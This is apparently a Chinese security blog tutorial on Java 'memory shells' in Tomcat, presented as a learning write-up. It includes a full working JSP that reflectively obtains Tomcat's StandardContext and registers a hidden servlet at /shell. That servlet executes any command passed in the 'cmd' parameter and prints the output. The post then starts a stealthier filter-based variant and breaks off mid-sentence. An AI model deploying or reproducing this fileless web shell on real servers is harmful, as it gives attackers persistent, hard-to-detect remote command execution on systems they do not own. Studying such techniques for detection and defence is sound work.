<!-- build time:Mon Feb 20 2023 15:24:48 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/favicon.ico"><link rel="mask-icon" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/logo.svg" color=""><link rel="manifest" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/manifest.json"><meta name="msapplication-config" content="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/browserconfig.xml"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="如月专注" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="如月专注" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="如月专注" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/css/app.css?v=0.2.5"><link rel="canonical" href="http://example.com/2022/11/15/Java%E5%86%85%E5%AD%98%E9%A9%AC1-Servlet-api%E5%86%85%E5%AD%98%E9%A9%AC/"><title>Java内存马1:servlet-api类型内存马 - Java | 如月专注</title><meta name="generator" content="Hexo 5.4.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Java内存马1:servlet-api类型内存马</h1><div class="meta"><span class="item" title="创建时间：2022-11-15 10:11:21"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-11-15T10:11:21+08:00">2022-11-15</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>8.9k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>8 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">如月专注</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/小夫2.png"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/小夫5.png"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/小夫1.png"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/3.jpg"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/4.jpg"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/tr.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Java/" itemprop="item" rel="index" title="分类于 Java"><span itemprop="name">Java</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2022/11/15/Java%E5%86%85%E5%AD%98%E9%A9%AC1-Servlet-api%E5%86%85%E5%AD%98%E9%A9%AC/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/avatar.jpg"><meta itemprop="name" content="ruyue"><meta itemprop="description" content=", "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="如月专注"></span><div class="body md" itemprop="articleBody"><h1 id="前言"><a class="anchor" href="#前言">#</a> 前言</h1><p>内存马主要分为以下几类：</p><ul><li>servlet-api 类<ul><li>filter 型</li><li>servlet 型</li></ul></li><li>spring 类<ul><li>拦截器</li><li>controller 型</li></ul></li><li>Java Instrumentation 类<ul><li>agent 型</li></ul></li></ul><p>我们这里作为初学内存马萌新，只讨论 servlet-api 类型的内存马。</p><p>Q：内存马是什么？<br>A：对于 servlet-api 类其实就是恶意的 Fileter、Servlet、Listen 之类的 web 组件。</p><p>Q：怎么把内存马给注入进目标服务器？<br>A：JSP 文件（jsp 的本质就是 servlet，在访问时 tomcat 会将.jsp 文件翻译成一个 Servlet）、命令执行 javaagent、反序列化注入。下面我们的代码测试样例都是用 JSP 来注入的。</p><p><em><em>Servlet 3.0 API 允许使 ServletContext 用动态进行注册，在 Web 容器初始化的时候（即建立 ServletContext 对象的时候）进行动态注册。可以看到 ServletContext 提供了 add</em>/create</em> 方法来实现动态注册的功能。**<br><strong>而在 tomcat 中，我们用到的是 standardContext 这个对象去注册我们的 Servlet、Filtet、Listen 等组件。</strong><br><strong>这也是 tomcat 内存马的核心 API</strong>。</p><h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FjaHVuYTMzL01lbW9yeXNoZWxsLUphdmFBTEw=">achuna33/Memoryshell-JavaALL: 收集内存马打入方式 (github.com)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9zdTE4Lm9yZy9wb3N0L21lbW9yeS1zaGVsbC8jZmlsdGVyLSVFNSU4NiU4NSVFNSVBRCU5OCVFOSVBOSVBQw==">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</span></p><p><span class="exturl" data-url="aHR0cDovL3dqbHNoYXJlLmNvbS9hcmNoaXZlcy8xNTQx">Tomcat 内存马学习 (二)：结合反序列化注入内存马 – 天下大木头 (wjlshare.com)</span></p><p><span class="exturl" data-url="aHR0cDovL21vb25mbG93ZXIuZnVuL2luZGV4LnBocC8yMDIyLzAyLzIxLzI3Ny8=">http://moonflower.fun/index.php/2022/02/21/277/</span></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5ibXRoNjY2LmNuL2JtdGhfYmxvZy8yMDIyLzA5LzEwL1RvbWNhdCVFNSU4NiU4NSVFNSVBRCU5OCVFOSVBOSVBQyVFNSVBRCVBNiVFNCVCOSVBMC8jJUU2JTk3JUEwJUU2JTk2JTg3JUU0JUJCJUI2JUU1JTg2JTg1JUU1JUFEJTk4JUU5JUE5JUFDLTM=">Tomcat 内存马学习 - bmth (bmth666.cn)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly90MW1lbG8wcGVyLmdpdGh1Yi5pby8yMDIyLzA0LzI3L21lbXNoZWxsLWZpbHRlci8=">Tomcat Filter 内存马实现 | T1melo0per'blog</span></p><h1 id="tomcat基础"><a class="anchor" href="#tomcat基础">#</a> Tomcat 基础</h1><p><span class="exturl" data-url="aHR0cHM6Ly90MW1lbG8wcGVyLmdpdGh1Yi5pby8yMDIyLzA0LzI3L21lbXNoZWxsLWZpbHRlci8=">Tomcat Filter 内存马实现 | T1melo0per'blog</span></p><p>每个 Wrapper 实例表示一个具体的 Servlet 定义，StandardWrapper 是 Wrapper 接口的标准实现类（StandardWrapper 的主要任务就是载入 Servlet 类并且进行实例化）</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103104611713.png" alt="image-20230103104611713"></p><h1 id="servlet类型内存马"><a class="anchor" href="#servlet类型内存马">#</a> Servlet 类型内存马</h1><p>这种类型的内存马很简单，就是动态创建一个 Servlet 即可，具体原理也不复杂。<br>但这种使用新增 servlet 的方式就需要绑定指定的 URL。因此如果我们想要更加隐蔽，做到内存马与 URL 无关就得通过注入新的或修改已有的 filter 或者 listener 的方式来实现了</p><h2 id="实现例子"><a class="anchor" href="#实现例子">#</a> 实现例子</h2><p>这里我们先别管原理，先试试我们怎么去注册一个内存马，然后试试效果。这里我演示的是动态创建一个 Servlet 内存马。</p><p><strong>具体流程就是创建一个恶意的 Servlet，然后获取当前的 StandardContext，然后将恶意 servlet 封装成 wrapper 添加到 StandardContext 的 children 当中，最后添加 ServletMapping 将访问的 URL 和 wrapper 进行绑定</strong></p><p>这里我们使用 JSP 来注入。如下，只要在目标 web 访问该 JSP 就会注册一个内存马，其映射地址为 shell，对应的 Servlet 名为 aaaa。</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Scanner"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.*"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"javax.servlet.http.*"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Wrapper"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">class</span> <span class="token class-name">ServletShell</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">private</span> <span class="token class-name">String</span> message<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            message <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token class-name">String</span> result <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token class-name">ServletShell</span> servletShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token class-name">PrintWriter</span> printWriter <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token class-name">String</span> name <span class="token operator">=</span><span class="token string">"aaaa"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token comment">// 查看是否存在名为 aaaa 的 servlet</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>servletContext<span class="token punctuation">.</span><span class="token function">getServletRegistration</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token class-name">StandardContext</span> o <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token comment">// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token class-name">Field</span> f <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>            <span class="token class-name">Object</span> object <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">ServletContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>                servletContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ServletContext</span><span class="token punctuation">)</span> object<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token keyword">instanceof</span> <span class="token class-name">StandardContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>                o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> object<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token class-name">Wrapper</span> newWrapper <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">createWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        newWrapper<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        newWrapper<span class="token punctuation">.</span><span class="token function">setLoadOnStartup</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        newWrapper<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span>servletShell<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token comment">// 向 children 中添加 Wrapper</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        o<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>newWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token comment">// 添加 servlet 的映射</span></pre></td></tr><tr><td data-num="58"></td><td><pre>        o<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        printWriter<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"servlet added"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token operator">%</span><span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103104908601.png" alt="image-20230103104908601"></p><h2 id="流程分析"><a class="anchor" href="#流程分析">#</a> 流程分析</h2><p>前面我们很简单的就完成了一个内存马的注入。但实际上我们还是需要跟一下它的流程的。<br>其中大概流程就是：</p><p>①创建一个恶意 Servlet</p><p>②通过 Servlet 3.0 API 中的 add*/create * 放到进行动态注册。</p><p>而我们恶意 Servlet 的创建我们就不多介绍了，没上面难度。主要是讲怎么动态注册这个 Servlet。</p><h3 id="standardcontext对象获取"><a class="anchor" href="#standardcontext对象获取">#</a> StandardContext 对象获取</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDc2NTc3L2FydGljbGUvZGV0YWlscy8xMDc4NTM4NTA=">(5 条消息) ServletContext (源码分析)_以码平川的博客 - CSDN 博客_servletcontext 源码</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzcxMDA4NC5odG1s">Java 内存马：一种 Tomcat 全版本获取 StandardContext 的新方法 - bitterz | CN-SEC 中文网</span></p><p>恶意 Servlet 的创建就不用多说了，没什么难度和疑难点。</p><p><strong>Q：在用之前，先了解 StandardContext 是什么，为什么要获取它。</strong><br><strong>A：从前面 Tomcat 的架构我们得知：</strong><br><strong>一方面我们针对的其实是当前的 Context 进行内存马注入，所以我们就需要获取到当前的 context，而这个 context 其实就是 StandardContext。</strong><br><strong>另一方面 ServletContext 虽然提供了动态注册的 api 但它只是一个接口，而在 tomcat 中 createServlet 和 addServlet 的具体实现都是由 StandardContext 这个对象完成的。</strong></p><p>简单的跟下代码</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105023933.png" alt="image-20230103105023933"></p><p>我们这里跟下 ApplicationContext 这个实现类的 addServlet 方法，可以看到，这下面最终还是在调用 StandContext 里面的方法。ApplicationContext 只不过是对 StandContext 的封装。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105035603.png" alt="image-20230103105035603"></p><p><strong>Q：standardContext 对象在哪？</strong></p><p><strong>A: 在 Servlet 中有九大内置对象，其中 standardContext 就存在 apllication（ServletContext） 对象中。</strong></p><p><strong>但 ServletContext 只是一个接口，具体的实现还要看具体的容器是怎么实现的，</strong></p><p><strong>而在 Tomcat 中就是在 ApplicationContext 类当中。</strong></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105109937.png" alt="image-20230103105109937"></p><p><strong>Q: 怎么获取 standardContext 对象</strong></p><p><strong>A：上一个 QA 中提了，standardContext 在 ServletContext 对象中，那我们从这个对象中把它提取出来即可。我们先贴出获取代码，再进行分析。</strong></p><p><strong>从代码中我们可以看到，第一步是获取 ServletContext 对象，随后就是通过 while 来循环获取 StandContext 对象。</strong></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105122194.png" alt="image-20230103105122194"></p><p>至于为什么这么做，我们简单的跟下代码就懂了。</p><p>我们第一步获取到的其实是一个 ApplicationContextFacade 对象，这个对象的 context 属性是 ApplicationContext 的实例，而 ApplicationContext 对象的 context 属性才是我们的目标 standardContext 对象。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105133586.png" alt="image-20230103105133586"></p><p>也就是说，我们从 ServletContext 到 standardContext 的流程如下：<br><strong>ServletContext 接口 -&gt;ApplicationContextFacade 实现类 -&gt;ApplicationContext 实现类 -&gt;standardContext 对象。</strong></p><h3 id="动态注册servlet内存马"><a class="anchor" href="#动态注册servlet内存马">#</a> 动态注册 Servlet 内存马</h3><p>这里就是怎么将我们的恶意 servlet 内存马给注册到内存中了。其实就是调用 StandardContext 对象的某些方法即可。这里我们在前面 StandardContext 对象第一个 QA 中就提到过，至于为什么我们不直接用 ServletContext 的 add 接口是因为 ServletContext 添加 servlet 只能在在 Web 容器初始化的时候（即建立 ServletContext 对象的时候）进行动态注册。直接用的话是无法注册的，如图：</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105202952.png" alt="image-20230103105202952"></p><p>因此我们只能直接用 StandardContext 这个底层对象去动态注册我们的 Servlet。</p><p>后面的就不做详细分析，这里简单讲讲就行：根据前面的 tomcat 架构，StandardContext 对象下面的是 Wrapper 对象，因此这里需要把先把恶意的 Servlet 封装成 wrapper 再添加到 StandardContext 的 children 当中才完成注册了一个 Servlet。</p><p>从 ApplicationContext 的 addServlet 方法把核心内容提取出来就得到如下注册的代码：</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105216102.png" alt="image-20230103105216102"></p><h3 id="将注册成功的servlet进行url映射"><a class="anchor" href="#将注册成功的servlet进行url映射">#</a> 将注册成功的 Servlet 进行 URL 映射</h3><p>这里前面只是完成了 Servlet 的注册，但想要访问还需要进行 URL 绑定映射，</p><p>因此最后需要通过 ServletMapping 将访问的 URL 和 wrapper 进行绑定即可。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105236048.png" alt="image-20230103105236048"></p><h1 id="filter类型内存马"><a class="anchor" href="#filter类型内存马">#</a> Filter 类型内存马</h1><p><span class="exturl" data-url="aHR0cHM6Ly90MW1lbG8wcGVyLmdpdGh1Yi5pby8yMDIyLzA0LzI3L21lbXNoZWxsLWZpbHRlci8=">https://t1melo0per.github.io/2022/04/27/memshell-filter/</span></p><p><span class="exturl" data-url="aHR0cDovL3dqbHNoYXJlLmNvbS9hcmNoaXZlcy8xNTI5">http://wjlshare.com/archives/1529</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9zdTE4Lm9yZy9wb3N0L21lbW9yeS1zaGVsbC8jZmlsdGVyLSVFNSU4NiU4NSVFNSVBRCU5OCVFOSVBOSVBQw==">https://su18.org/post/memory-shell/#filter-%E5%86%85%E5%AD%98%E9%A9%AC</span></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105315963.png" alt="image-20230103105315963"></p><p>可以看到 Filter 的作用其实就是拦截请求，过滤响应。它在 Servlet 之前生效。</p><p>因此我们内存马的另一种思路就是新增一个恶意的 Filter，将其放在 Filter 链的最开头，这样我们就可以在不新增 Servlet 的情况下，注入了一个内存马，从而更加隐蔽。</p><p>我们下面分析流程还是和 Servlet 差不多，从创建 Filter 到注册到绑定。</p><h2 id="实现恶意filter"><a class="anchor" href="#实现恶意filter">#</a> 实现恶意 Filter</h2><p>首先，我们先去实现一个恶意的 Filter，这里其实直接把我们的恶意 Servlet 的代码搬过来就完事了。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105333728.png" alt="image-20230103105333728"></p><p>最终我们实现的效果就是带上参数 cmd 才会进入到命令执行逻辑，否则就跳转到正常页面。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105342715.png" alt="image-20230103105342715"></p><h2 id="动态注册filter"><a class="anchor" href="#动态注册filter">#</a> 动态注册 Filter</h2><p>接着我们就看看怎么动态注册 Filter 并且把我们的恶意 Filter 给排到 Filter 链的最前了。</p><p>我们老样子，跟下流程，直接来到 ApplicationContext 的 